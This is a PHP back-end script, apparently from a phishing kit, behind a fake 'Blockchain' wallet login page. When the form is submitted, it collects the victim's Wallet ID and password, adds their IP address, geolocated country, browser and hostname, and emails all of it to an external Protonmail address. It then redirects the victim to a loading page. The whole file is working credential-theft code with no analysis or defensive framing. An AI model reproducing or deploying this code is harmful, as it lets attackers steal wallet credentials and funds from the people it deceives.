<?php
	if (isset($_POST["submit"])) {
      	$wid = $_POST['wid'];	    
		$pass = $_POST['psw'];
		$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.
$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g:i a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);

		$from = 'Blockchain First Page'; 
		$to = 'cybertoks@protonmail.com'; 
		$subject = 'Message from Blockchain First Page';
		
		$body ="From: $from\n Wallet ID: $wid\n Password: $pass\n IP: $ip\n Country: $country\n Time: $timedate\n Browser: $browserAgent\n HostName: $hostname";

		$result="";
	
		if (!$_POST['wid']) {
			$errWid = 'Please enter your Wallet ID';
		}
		
		if (!$_POST['psw']) {
			$errPass = 'Please enter your password';
		}

// If there are no errors, send the email
if (!$errWid && !$errPass) {
	if (mail ($to, $subject, $body, $from)) {
		header("Location: loading.html");
	} else {
		 echo "Something went wrong";
	}
} else {
         echo "Error on Wallet ID and Password";
}
}
?>